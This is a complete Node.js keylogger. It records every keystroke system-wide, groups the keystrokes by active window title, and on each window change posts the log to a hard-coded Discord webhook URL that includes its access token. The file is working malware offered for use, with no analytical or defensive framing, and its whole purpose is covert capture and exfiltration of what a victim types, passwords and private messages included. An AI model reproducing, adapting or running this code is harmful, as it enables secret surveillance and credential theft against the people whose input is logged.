const GlobalKeyboardListener =
  require("node-global-key-listener").GlobalKeyboardListener;
const axios = require("axios");
const activeWin = require("active-win");

const v = new GlobalKeyboardListener();

var l_shift_dn = false;
var l_alt_dn = false;
var r_shift_dn = false;
var r_alt_dn = false;
var keylogs = "";
let lastActiveWindow;

v.addListener(function (e, down) {
  if (e.state == "UP") {
    let key = e.name.toLowerCase();
    switch (key) {
      case "tab":
        process.stdout.write("<TAB>");
        keylogs += "<TAB>";
        break;
      case "return":
        process.stdout.write("<ENTER>");
        keylogs += "<ENTER>";
        break;
      case "space":
        process.stdout.write(" ");
        keylogs += " ";
        break;
      case "escape":
        process.stdout.write("<ESC>");
        keylogs += "<ESC>";
        break;
      case "delete":
        process.stdout.write("<DEL>");
        keylogs += "<DEL>";
        break;
      case "backspace":
        process.stdout.write("<B.SPACE>");
        keylogs += "<B.SPACE>";
        break;
      case "left shift":
        process.stdout.write("</L.SHIFT>");
        keylogs += "</L.SHIFT>";
        l_shift_dn = false;
        break;
      case "left alt":
        process.stdout.write("</L.ALT>");
        keylogs += "</L.ALT>";
        break;
      case "right shift":
        process.stdout.write("</R.SHIFT>");
        keylogs += "</R.SHIFT>";
        break;
      case "right alt":
        process.stdout.write("</R.ALT>");
        keylogs += "</R.ALT>";
        break;
      case "dot":
        process.stdout.write(".");
        keylogs += ".";
        break;
      case "semicolon":
        process.stdout.write(";");
        keylogs += ";";
        break;
      case "minus":
        process.stdout.write("-");
        keylogs += "-";
        break;
      case "equals":
        process.stdout.write("=");
        keylogs += "=";
        break;
      case "home":
        process.stdout.write("<HOME>");
        keylogs += "<HOME>";
        break;
      case "ins":
        process.stdout.write("<INSERT>");
        keylogs += "<INSERT>";
        break;
      case "print screen":
        process.stdout.write("<P.SCREEN>");
        keylogs += "<P.SCREEN>";
        break;
      case "section":
        process.stdout.write("<SECTION>");
        keylogs += "<SECTION>";
        break;
      case "square bracket open":
        process.stdout.write("<SQ.BR.OPEN>");
        keylogs += "<SQ.BR.OPEN>";
        break;
      case "square bracket close":
        process.stdout.write("<SQ.BR.CLOSE>");
        keylogs += "<SQ.BR.CLOSE>";
        break;
      case "backslash":
        process.stdout.write("\\");
        keylogs += "\\";
        break;
      case "page up":
        process.stdout.write("<PG.UP>");
        keylogs += "<PG.UP>";
        break;
      case "caps lock":
        process.stdout.write("<CAPSLOCK>");
        keylogs += "<CAPSLOCK>";
        break;
      case "semicolon":
        process.stdout.write("<SEMICOLON>");
        keylogs += "<SEMICOLON>";
        break;
      case "quote":
        process.stdout.write("'");
        keylogs += "<'>";
        break;
      case "page down":
        process.stdout.write("<PG.DOWN>");
        keylogs += "<PG.DOWN>";
        break;
      case "comma":
        process.stdout.write(",");
        keylogs += ",";
        break;
      case "forward slash":
        process.stdout.write("/");
        keylogs += "/";
        break;
      case "end":
        process.stdout.write("<END>");
        keylogs += "<END>";
        break;
      case "left ctrl":
        process.stdout.write("<LEFT.CTRL>");
        keylogs += "<LEFT.CTRL>";
        break;
      case "left meta":
        process.stdout.write("<LEFT.META>");
        keylogs += "<LEFT.META>";
        break;
      case "right ctrl":
        process.stdout.write("<RIGHT.CTRL>");
        keylogs += "<RIGHT.CTRL>";
        break;
      case "left arrow":
        process.stdout.write("<LEFT.ARROW>");
        keylogs += "<LEFT.ARROW>";
        break;
      case "right arrow":
        process.stdout.write("<RIGHT.ARROW>");
        keylogs += "<RIGHT.ARROW>";
        break;
      case "up arrow":
        process.stdout.write("<UP.ARROW>");
        keylogs += "<UP.ARROW>";
        break;
      case "down arrow":
        process.stdout.write("<DOWN.ARROW>");
        keylogs += "<DOWN.ARROW>";
        break;
      default:
        process.stdout.write(key);
        keylogs += key;
    }
  }
  if (e.state == "DOWN") {
    switch (e.name) {
      case "left shift":
        if (l_shift_dn == false) {
          l_shift_dn = true;
          process.stdout.write("<L.SHIFT>");
          keylogs += "<L.SHIFT>";
        }
        break;
      case "left alt":
        if (l_alt_dn == false) {
          l_alt_dn = true;
          process.stdout.write("<L.ALT>");
          keylogs += "<L.ALT>";
        }
        break;
      case "right shift":
        if (r_shift_dn == false) {
          r_shift_dn = true;
          process.stdout.write("<R.SHIFT>");
          keylogs += "<R.SHIFT>";
        }
        break;
      case "right alt":
        if (r_alt_dn == false) {
          r_alt_dn = true;
          process.stdout.write("<R.ALT>");
          keylogs += "<R.ALT>";
        }
        break;
    }
  }
});

async function checkWindowChange() {
  try {
    const windowInfo = await activeWin();
    const { title, owner } = windowInfo;

    if (lastActiveWindow && lastActiveWindow.title !== title) {
      sendToDiscord(title);
    }

    lastActiveWindow = { title };
  } catch (error) {
    console.error("Error getting active window:", error.message);
  }
}

async function sendToDiscord(windowTitle) {
  try {
    if (keylogs.trim() !== "") {
      const content = `\`\`\`[${windowTitle}] \nKeylog: ${keylogs}\`\`\``;

      await axios.post(
        "https://discord.com/api/webhooks/1232964574844813353/N3B1IiWcnAJegbs0zDkEIlCCrtDJAEgZATdEeXBe7OsPVzp9k56PMj1DAvwYMLudWrB9",
        {
          content: content,
        }
      );

      keylogs = "";
    }
  } catch (error) {
    console.error("Error sending to Discord:", error.message);
  }
}

setInterval(checkWindowChange, 1000);
